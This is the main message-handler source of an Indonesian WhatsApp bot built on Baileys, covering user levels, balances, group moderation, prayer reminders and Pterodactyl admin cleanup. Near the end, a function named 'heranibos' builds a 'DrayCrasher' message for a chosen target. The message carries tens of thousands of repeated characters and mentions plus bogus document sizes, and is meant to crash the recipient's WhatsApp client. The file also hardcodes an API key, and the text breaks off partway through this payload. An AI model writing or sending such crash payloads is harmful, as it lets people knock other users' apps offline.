require('./lib/settings/settings')
const { generateWAMessageFromContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage,InteractiveMessage, proto, delay
} = require('@whiskeysockets/baileys')
const axios = require('axios')
const { Client } = require('ssh2')
const cheerio = require('cheerio')
const fs = require('fs')
const fetch = require('node-fetch')
const FormData = require('form-data')
const { sizeFormatter } = require('human-readable')
const format = sizeFormatter()
const jimp = require('jimp')
const ms = require('parse-ms')
const crypto = require('crypto')
const moment = require('moment-timezone')
const os = require('os')
const PhoneNumber = require('awesome-phonenumber') 
const path = require('path')
const stream = require('stream')
const util = require('util')
const ffmpeg = require('fluent-ffmpeg') 
const { fromBuffer } = require('file-type')
const { exec, execSync } = require('child_process')

//==========================

const { Saweria } = require('./lib/general/saweria')
const own = JSON.parse(fs.readFileSync('./data/owner.json').toString())
const premium = JSON.parse(fs.readFileSync('./data/premium.json'))
const res = JSON.parse(fs.readFileSync('./data/reseller.json').toString())
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/general/scrape')
let db_respon_list = JSON.parse(fs.readFileSync('./data/list-message.json'))
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser, createSerial } = require('./lib/general/scrape')
const { casinoSave, setCasino, deleteCasino } = require('./lib/game/casino')

//==========================

const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot/clone')
const antispam = require('./lib/general/scrape')
const prem = require("./lib/general/premium");
const afk = require('./lib/general/scrape')
let _afk = JSON.parse(fs.readFileSync('./data/afk.json'))
const _sewa = require('./lib/general/scrape')
let sewa = JSON.parse(fs.readFileSync('./data/sewa.json'))

//==========================

const { ephoto, CarbonifyV1, CarbonifyV2, mediafireDl, getMimeType, ssweb, tiktokSearchVideo, searchSpotifyTracks, pinterest, toBase64, toOriginal, obfusc, deobfusc, toGhRaw, toGhOri, toFont, kapital, obfus1, obfus2, autoLevelUp, getprodukDariFile, simpenProduknya, getidProduk, cekProduknye, addprodukzz, delprodukzz, updprodukzz, getprodukdb, simpenSmTr, getSmTr, getTrId, cIdTrnya, saveTrnye, simpenDisc, getDisczz, addDisczz, persenDiskonnya, ngerestokk, bacaData, simpanData, buatPapan, lemparDadu, generateTanggaDanUlar, pindahPosisi, mulaiGame, joinGame, mainGame, hapusGame, cariIdGame, mainGameAuto, hapusGameAuto, getRewards, rapihin, rapihin2, addWm, speedVideo, detekFps, ubahFps, audio2txt, getIPInfo,convertRecords, fetchDNSRecordsFromHackertarget, fetchDNSRecords, getEwalletInfo, ytdl } = require('./lib/general/scrape')
const { search } = require('yt-search')
const { sticker5 } = require('./lib/general/sticker')
const apiKey = '59cd1d8559e5fa45edb5dff79cd51acc';

//==========================

const family100 = {}
const suit = {}
const tictactoe = {}
const petakbom = {}
const tebakgambar = {}
const tebakkalimat = {}
const tebakkata = {}
const tebaklirik = {}
const tebakanime = {}
const tebaklagu = {}
const kuis = {}
const tebakkimia = {}
const tebakbendera = {}
const siapakahaku = {}
const asahotak = {}
const susunkata = {}
const caklontong = {}
const kuismath = {}
const tebakgame = {}
const permintaan = {}
const laporan = {}
const userSessions = {}
const exceptFiles = []

//==========================

module.exports = Line = async (Line, m, chatUpdate, mek, store) => {
try {

const chalk = require('chalk')
const code = fs.readFileSync('./Line.js', 'utf8')
var regex = /case\s+'([^']+)':/g
var matches = []
var match
while ((match = regex.exec(code))) {
matches.push(match[1])
}
global.help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean)
global.handlers = []
const handlersDir = path.join(__dirname, 'plugin')
fs.readdirSync(handlersDir).forEach(file => {
const filePath = path.join(handlersDir, file)
if (fs.statSync(filePath).isFile() && file.endsWith('.js')) {
const handler = require(filePath)
global.handlers.push(handler)
global.help.push(...handler.command)
}})

const { type } = m
const { parseMention, getRandom, getBuffer, fetchJson, runtime, sleep, isUrl, getTime, formatp, getGroupAdmins, pickRandom, monospace, randomKarakter, randomNomor, toRupiah, toDolar, happymod, FileSize, resize, nebal, totalFitur, smsg } = require('./lib/general/myfunc')


var body = m.body
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_|~!?#%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_|~!?#%^&.+-,\/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const isCommand2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const command = prefixx ? isCommand : isCommand2
const pushname = m.pushName || "No Name"
const botNumber = await Line.decodeJid(Line.user.id)
const bulan = moment.tz('Asia/Jakarta').format('DD/MMMM')
const tahun = moment.tz('Asia/Jakarta').format('YYYY')
const jam = moment.tz("Asia/Jakarta").format('HH:mm:ss');    
const tgl = moment.tz("Asia/Jakarta").format('YYYY-MM-DD');
const wibTime = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const penghitung = moment().tz("Asia/Jakarta").format("dddd, D MMMM - YYYY")

const isOwner = [owner, botNumber, ...own].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isReseller = [owner, botNumber, ...res].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isOwner ? true : prem.checkPremiumUser(m.sender, premium)


const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const isSewa = _sewa.checkSewaGroup(m.chat, sewa)
const args = body.trim().split(/ +/).slice(1)
const full_args = body.replace(command, '').slice(1).trim()
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = m.key.remoteJid
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isMediaa = /image|video/.test(mime)
const isPc = from.endsWith('@s.whatsapp.net')
const isGc = from.endsWith('@g.us')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const qmsg = (quoted.msg || quoted)
const isGroup = from.endsWith('@g.us')
const sender = m.key.fromMe ? (Line.user.id.split(':')[0]+'@s.whatsapp.net' || Line.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const isBot = botNumber.includes(senderNumber)
const groupMetadata = m.isGroup ? await Line.groupMetadata(m.chat) :''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter((v) => v.admin !== null).map((i) => i.id) : [] || [];
const groupOwner = m.isGroup ? groupMetadata?.owner : false;
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const groupMembers = isGroup ? groupMetadata.participants : ''
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const tag = `${m.sender.split('@')[0]}`
const usere = `${m.sender.split('@')[0]}`+'@s.whatsapp.net'
const nomore = m.sender.replace(/[^0-9]/g, '')
const content = JSON.stringify(m.message)
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isAudio = (type == 'audioMessage')
const isSticker = (type == 'stickerMessage')

if (!Line.public) {
if (!isOwner && !m.key.fromMe) return
}

const contacts = JSON.parse(fs.readFileSync('./data/contacts.json'))
const isContacts = contacts.includes(sender)
if (wibTime < "23:59:59"){ var ucapanWaktu = 'Selamat malam'}
if (wibTime < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if (wibTime < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if (wibTime < "14:59:59"){ var ucapanWaktu = 'Selamat siang'}
if (wibTime < "10:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if (wibTime < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'}

try {
const currentTimee = Date.now()
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!('daftar' in user)) user.daftar = false
if (!('nama' in user)) user.nama = `${pushname}`
if (!('otp' in user)) user.otp = randomNomor(1000, 9999)
if (!('email' in user)) user.email = '-'
if (!('serial' in user)) user.serial = '-'
if (!('banned' in user)) user.banned = false
if (!('Line' in user)) user.Line = false
if (!('autoai' in user)) user.autoai = false
if (!('lastUnregTime' in user)) user.lastUnregTime = currentTimee
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.saldo)) user.saldo = 0
if (!isNumber(user.limit)) user.limit = 0
if (!isNumber(user.level)) user.level = 0
if (!isNumber(user.exp)) user.exp = 0
} else global.db.data.users[m.sender] = {
daftar: false,
nama: `${pushname}`,
otp: randomNomor(1000, 9999),
email: '-',
serial: '-',
Line: false,
banned: false,
lastUnregTime: currentTimee,
gold: 0,
saldo: 0,
limit: 0,
level: 0,
exp: 0
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('antilink' in chats)) chats.antilink = false
if (!('antilinkgc' in chats)) chats.antilinkgc = false
if (!('mute' in chats)) chats.mute = false
if (!('nsfw' in chats)) chats.nsfw = false
} else global.db.data.chats[m.chat] = {
antilink: false,
antilinkgc: false,
mute: false,
nsfw: false
}} catch(err) {
console.log('')
}

fs.writeFileSync('./data/db/database.json', JSON.stringify(global.db.data, null, 2))

const addGold = (userId, amount) => {
if (!global.db.data.users[userId]) {
global.db.data.users[userId] = { gold: 0 }
}
global.db.data.users[userId].gold += amount
fs.writeFileSync('./data/db/database.json', JSON.stringify(global.db, null, 3));
}

const minGold = (userId, amount) => {
if (global.db.data.users[userId]) {
global.db.data.users[userId].gold -= amount
fs.writeFileSync('./data/db/database.json', JSON.stringify(global.db, null, 3))
}}

const cekGold = (userId) => {
if (global.db.data.users[userId]) {
return global.db.data.users[userId].gold
} else {
return 0
}}

const addSaldo = (userId, amount) => {
if (!global.db.data.users[userId]) {
global.db.data.users[userId] = { saldo: 0 }
}
global.db.data.users[userId].saldo += amount
fs.writeFileSync('./data/db/database.json', JSON.stringify(global.db, null, 3));
}

const minSaldo = (userId, amount) => {
if (global.db.data.users[userId]) {
global.db.data.users[userId].saldo -= amount
fs.writeFileSync('./data/db/database.json', JSON.stringify(global.db, null, 3))
}}

const cekSaldo = (userId) => {
if (global.db.data.users[userId]) {
return global.db.data.users[userId].saldo
} else {
return 0
}}

const addLimit = (userId, amount) => {
if (!global.db.data.users[userId]) {
global.db.data.users[userId] = { limit: 0 }
}
global.db.data.users[userId].limit += amount
fs.writeFileSync('./data/db/database.json', JSON.stringify(global.db, null, 3));
}

const minLimit = (userId, amount) => {
if (global.db.data.users[userId]) {
global.db.data.users[userId].limit -= amount
fs.writeFileSync('./data/db/database.json', JSON.stringify(global.db, null, 3))
}}

const cekLimit = (userId) => {
if (global.db.data.users[userId]) {
return global.db.data.users[userId].limit
} else {
return 0
}}

async function ranke(idnya) {
var rrole = db.data.users[idnya].level
var rank = 'Bronze'
var rankid = 1
if (rrole <= 1) {
rank = 'Bronze'
rankid = 1
} else if (rrole <= 2) {
rank = 'Bronze'
rankid = 2
} else if (rrole <= 3) {
rank = 'Bronze'
rankid = 3
} else if (rrole <= 4) {
rank = 'Silver'
rankid = 1
} else if (rrole <= 5) {
rank = 'Silver'
rankid = 2
} else if (rrole <= 6) {
rank = 'Silver'
rankid = 3
} else if (rrole <= 7) {
rank = 'Gold'
rankid = 1
} else if (rrole <= 8) {
rank = 'Gold'
rankid = 2
} else if (rrole <= 9) {
rank = 'Gold'
rankid = 3
} else if (rrole <= 10) {
rank = 'Diamond'
rankid = 1
} else if (rrole <= 11) {
rank = 'Diamond'
rankid = 2
} else if (rrole <= 12) {
rank = 'Diamond'
rankid = 3
} else if (rrole <= 13) {
rank = 'Master'
rankid = 1
} else if (rrole <= 14) {
rank = 'Master'
rankid = 2
} else if (rrole <= 15) {
rank = 'Max'
rankid = 0
}
return { rank, rankid }
}

try {
var ppuser = await Line.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'}
let ppnyauser = ppuser

async function addLevel(userId, xp, db, m) {
let user = db.data.users[userId]
if (!user) {
user = { level: 0, exp: 0 }
db.data.users[userId] = user
}
const leveledUp = autoLevelUp(user, xp)
if (leveledUp) {
await handleLevelUp(user, m)
} else if (user.level >= 15) {
await notifyMaxLevel(user, m)
}}

async function handleLevelUp(user, m) {
const rewards = getRewards(user.level)
let txt = `Selamat, kamu telah naik level 🎉\nLevel: ${user.level - 1} •> ${user.level}\nExp: ${user.exp}\n\nHadiah:\n+${toRupiah(rewards.saldo)} Saldo\n+${toRupiah(rewards.limit)} Limit`
let background = encodeURIComponent("https://telegra.ph/file/a78e1566a6e06b935fba5.jpg")
let name = encodeURIComponent(pushname)
let avatar = encodeURIComponent(ppnyauser)
await Line.sendMessage(m.chat, {image: { url: `https://api.vreden.my.id/api/levelup?background=${background}&name=${name}&level=${user.level - 1}&levelup=${user.level}&avatar=${avatar}` }, caption: txt }, { quoted: m })
await addSaldo(m.sender, rewards.saldo)
await addLimit(m.sender, rewards.limit)
}

if (command && !m.fromMe) {
const xp = randomNomor(39, 89)
addLevel(m.sender, xp, global.db, m)
}

Line.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
}
Line.sendTeks = async(chatId, text = '', quoted = '', opts = {}) => {
return Line.sendMessage(chatId, { text: text, mentions: await Line.ments(text), ...opts}, {quoted: quoted})
}
Line.sendPoll = (jid, name = '', values = [], selectableCount = global.select) => {
return Line.sendMessage(jid, {poll: { name, values, selectableCount }})
}

const p_c = prefix+command
_sewa.expiredCheck(Line, sewa)

const reply = (teks) => {
return Line.sendMessage(m.chat, { text: teks, mentions: Line.ments(teks) }, {quoted: m})
}

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  Line.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  Line.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: m})}
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [m.sender]}
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `0@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${db.data.users[m.sender].nama}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${db.data.users[m.sender].nama},;;;\nFN:${db.data.users[m.sender].nama},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const ftext = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: {extendedTextMessage: {text: `${prefix+command} ${q}`,thumbnailUrl: thumb}}}
const ftoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast" } : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": "", }, "title": `Payment by ${ownername}`,"description": null, "currencyCode": "IDR", "priceAmount1000": "30000000", "retailerId": `Powered by Line`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
const floc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered by Line`,jpegThumbnail: ""}}}

Line.sendOrder = async (jid, text, img, itcount, ammount, qnya = m) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": "65bh4ddqr90",
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "product",
"message": text,
"sellerJid": m.sender,
"token": "775BBQR0",
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
"contextInfo": {
"mentionedJid": [m.sender]
}}
}), { userJid: m.sender, quoted: qnya })
return Line.relayMessage(jid, order.message, { messageId: order.key.id})
}

Line.autosholat = Line.autosholat ? Line.autosholat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Line.user.jid : m.sender
let id = m.chat
if (!(id in Line.autosholat)) {
let jadwalSholat = {
Fajr: "04:31",
Dzuhur: "11:45",
Ashar: "15:06",
Magrib: "17:39",
Isya: "19:09",
}
const date = new Date((new Date).toLocaleString("en-US", {
timeZone: "Asia/Jakarta"
}));
const hours = date.getHours();
const minutes = date.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
if (sholat === "Fajr") {
thumbislam = "https://telegra.ph/file/b666be3c20c68d9bd0139.jpg"
} else if (sholat === "Dzuhur") {
thumbislam = "https://telegra.ph/file/5295095dad53783b9cd64.jpg"
} else if (sholat === "Ashar") {
thumbislam = "https://telegra.ph/file/c0e1948ad75a2cba22845.jpg"
} else if (sholat === "Magrib") {
thumbislam = "https://telegra.ph/file/0082ad9c0e924323e08a6.jpg"
} else if (sholat === "Isya") {
thumbislam = "https://telegra.ph/file/fd141833a983afa0a8412.jpg"
} else {
thumbislam = "https://telegra.ph/file/687fd664f674e90ae1079.jpg"
}
Line.autosholat[id] = [
Line.sendMessage(m.chat, {
audio: {
url: "https://www.vreden.my.id/cdn/islamic/y2mate.com%20-%20Adzan%20Merdu%20Irama%20Jiharkah%20%20menyejukkan%20hati%20.mp3"
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `Waktu ${sholat} telah tiba, ambilah air wudhu dan segeralah sholat 😇`,
body: 'Tuk wilayah Jakarta dan sekitarnya',
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: thumbislam,
sourceUrl: "-"
}}
}, {quoted: m}),
setTimeout(() => {
delete Line.autosholat[id]
}, 57000)
]}}
}

function bold(text) {
  return `*${text}*`
}

function countProfit(jumlahAwal) {
    jumlahAwal = parseInt(jumlahAwal)
    let keuntungan = jumlahAwal * 1
    if (keuntungan > 1000) {
        keuntungan = 1000
    }
    return (jumlahAwal + keuntungan).toFixed(0)
}

function loadWhitelist() {
try {
const data = fs.readFileSync('./data/adp/whitelist.json');
const parsed = JSON.parse(data);
return parsed.emails || [];
} catch (error) {
console.error('Failed to load whitelist:', error);
return [];
}
}

function saveWhitelist(emails) {
try {
fs.writeFileSync('./data/adp/whitelist.json', JSON.stringify({ emails }, null, 2));
console.log('Whitelist updated successfully.');
} catch (error) {
console.error('Failed to save whitelist:', error);
}
}

function loadWhitelist() {
try {
const data = fs.readFileSync('./data/adp/whitelist.json');
const parsed = JSON.parse(data);
return parsed.emails || [];
} catch (error) {
console.error('Failed to load whitelist:', error);
return [];
}
}

let whitelistEmails = loadWhitelist();

let monitoringAntiAdminIlegal = false; 

async function fetchPaginatedData(endpoint) {
let results = [];
let page = 1;
try {
while (true) {
const response = await fetch(`${global.domain}/api/application/${endpoint}?page=${page}`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`
}
});
const data = await response.json();
if (!response.ok) {
console.error(`🚩 API Error (${endpoint}):`, JSON.stringify(data));
break;
}
results = results.concat(data.data);
if (!data.meta.pagination || page >= data.meta.pagination.total_pages) {
break;
}
page++;
}
} catch (error) {
console.error(`🚩 Terjadi kesalahan saat mengambil data dari ${endpoint}:`, error);
}
return results;
}

async function deleteIllegalAdmins() {
try {
const users = await fetchPaginatedData('users');
for (const user of users) {
const isAdmin = user.attributes.root_admin;
const email = user.attributes.email;
const userId = user.attributes.id;
if (email.endsWith('@vcloudx.me')) {
console.log(`✅ Mengabaikan admin dengan email: ${email}`);
continue;
}
if (isAdmin) {
try {
await deleteServersByOwner(userId);
const deleteResponse = await fetch(`${global.domain}/api/application/users/${userId}`, {
method: "DELETE",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`
}
});
const deleteData = deleteResponse.ok ? { errors: null } : await deleteResponse.json();
if (deleteData.errors) {
console.error(`🚩 Gagal menghapus admin ${email}: ${JSON.stringify(deleteData.errors)}`);
} else {
console.log(`✅ Berhasil menghapus admin: ${email}`);
}
} catch (error) {
console.error(`🚩 Terjadi kesalahan saat menghapus admin ${email}:`, error);
}
}
}
} catch (error) {
console.error('🚩 Terjadi kesalahan saat mendeteksi admin ilegal:', error);
}
}

async function deleteServersByOwner(ownerId) {
try {
const servers = await fetchPaginatedData('servers');
const ownerServers = servers.filter(server => server.attributes.user === ownerId);
for (const server of ownerServers) {
const serverId = server.attributes.id;
try {
const deleteResponse = await fetch(`${global.domain}/api/application/servers/${serverId}`, {
method: "DELETE",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`,
}
});
const deleteData = deleteResponse.ok ? { errors: null } : await deleteResponse.json();
if (deleteData.errors) {
console.error(`🚩 Gagal menghapus server ID ${serverId}: ${JSON.stringify(deleteData.errors)}`);
} else {
console.log(`✅ Berhasil menghapus server ID ${serverId} untuk user ID ${ownerId}.`);
}
} catch (error) {
console.error(`🚩 Terjadi kesalahan saat menghapus server ID ${serverId}:`, error);
}
}
} catch (error) {
console.error('🚩 Terjadi kesalahan saat menghapus server:', error);
}
}

let regionNames = new Intl.DisplayNames(['en'], { type: 'region' })

const unixTimestampSeconds = (date = new Date()) => Math.floor(date.getTime() / 1000)

const generateMessageTag = (epoch) => {
    let tag = (0, unixTimestampSeconds)().toString();
    if (epoch)
        tag += '.--' + epoch;
    return tag;
}

const processTime = (timestamp, now) => {
	return moment.duration(now - moment(timestamp * 1000)).asSeconds()
}

async function vreply(teks) {
const nedd = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `Channel ${wm}`,
newsletterJid: chjid + "@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `Line 2024`,
body: ``,
previewType: "PHOTO",
thumbnailUrl: global.thumb, 
sourceUrl: sch, 
},
},
text: teks,
};
return Line.sendMessage(m.chat, nedd, {quoted: m,})
}

async function vreply2(teks) {
const nedd = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `Channel ${wm}`,
newsletterJid: chjid + "@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `Line 2024`,
body: ``,
previewType: "PHOTO",
thumbnailUrl: global.thumb, 
sourceUrl: syt, 
},
},
text: teks,
};
return Line.sendMessage(m.chat, nedd, {quoted: m,})
}

if (db.data.chats[m.chat].antilink) {
if (budy.match('chat.whatsapp|wa.me|whatsapp.com|t.me|http|www.')) {
if (!isBotAdmins) return !0
if (isAdmins) return !0
if (isOwner) return !0
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Line.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}}

if (db.data.chats[m.chat].antilinkgc) {
if (budy.match('chat.whatsapp')) {
if (!isBotAdmins) return !0
if (isAdmins) return !0
if (isOwner) return !0
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Line.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}}

if (budy && !m.key.fromMe && global.antibot) {
if (m.isBaileys) {
if (isAdmins || isOwner || !isBotAdmins) return
m.reply(`*( Anti Bot )* Kamu akan dikeluarkan dari grup ini.`)
await Line.sendMessage(m.chat, { delete: m.key })
await sleep(1000)
Line.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}}

if (db.data.chats[m.chat].antitoxic) {
const budy = m.message.conversation || "";
const sender = m.sender;
const toxicWords = ['babi', 'ajg', 'anjing', 'mmk', 'mmek','memk','memek', 'kntl', 'kontl', 'kntol', 'puqi', 'puqimak', 'ppk', 'ppq', 'pepek', 'ppek', 'ppeq', 'jembud', 'jembut', 'jmbt', 'jmbd', 'jemboed', 'jemboet', 'jmbod', 'jmbud', 'jmbut', 'jmbot', 'bangsat', 'bangke', 'pantek', 'bgsat', 'bngsat', 'bgst', 'bgke', 'bngke', 'pntk', 'pntek', 'pantk', 'gblk', 'gblok', 'goblok', 'gblg', 'gblog', 'goblog', 'kintil', 'mimik', 'raimu', 'fefek', 'ngtd', 'ngntod', 'ngentd', 'ngentod', 'ngntt', 'ngntot', 'mgentt', 'ngentot', 'njing', 'jing', 'pussy', 'dick', 'stupid', 'dog', 'titit', 'titid', 'ttid', 'ttit', 'tytyd', 'tytyt', 'kontol', 'pepeq', 'koncol', 'ngentit'];
const maxWarnings = 5;
if (toxicWords.some(word => budy.toLowerCase().includes(word))) {
if (!isAdmins && !isOwner) {
db.data.chats[m.chat].warnings = db.data.chats[m.chat].warnings || {};
db.data.chats[m.chat].warnings[sender] = (db.data.chats[m.chat].warnings[sender] || 0) + 1;
const warnings = db.data.chats[m.chat].warnings[sender];
await Line.sendMessage(m.chat, { text: 
`📮 *Kata-Kata Toxic Terdeteksi*

- Warning: ${warnings}/${maxWarnings}

*Jika warning mencapai ${maxWarnings}, kamu akan dikeluarkan dari grup.*
`});
if (warnings >= maxWarnings) {
if (!isBotAdmins) return;
if (isAdmins || isOwner) return;
await Line.sendMessage(m.chat, { text: 
`📮 *Kata-Kata Toxic Terdeteksi*

- Warning: ${warnings}/${maxWarnings}

*Kamu kena kick karna sudah 5x berkata kasar!*`});
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: sender } });
await Line.groupParticipantsUpdate(m.chat, [sender], 'remove');
delete db.data.chats[m.chat].warnings[sender];
}}}
}

async function loading () {
var nln = [
"Line • • •",
"Line • • • • •",
"Line • • • • • • •",
"Line • • • • •",
"Line • • •",
"Line • • • • •",
"Line • • • • • • •",
]
let { key } = await Line.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(700, 900)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await Line.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function vreact() {
Line.sendMessage(from, {react: {text: "🔎", key: m.key}})
}

async function vreact2(emoji) {
Line.sendMessage(from, {react: {text: emoji, key: m.key}})
}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await Line.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await Line.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit3 (tex1, tex2, tex3) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`
]
let { key } = await Line.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await Line.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit5 (tex1, tex2, tex3, tex4, tex5) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`,
`${tex4}`,
`${tex5}`
]
let { key } = await Line.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(900, 1500)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await Line.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function heranibos(Target, Ptpc = false) {
let textnya = "🗡𝐙𝐞𝐧𝐨 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮↯\n© DrayCrasher" + "ꦾ".repeat(90000) + "@6283151568511".repeat(50000);
await Line.relayMessage(Target, {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "Drayy",
fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
contactVcard: true,
jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
},
hasMediaAttachment: true
},
body: {
text: textnya
},
nativeFlowMessage: {},
contextInfo: {
mentionedJid: ["6283151568511@s.whatsapp.net"],
forwardingScore: 1,
isForwarded: true,
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
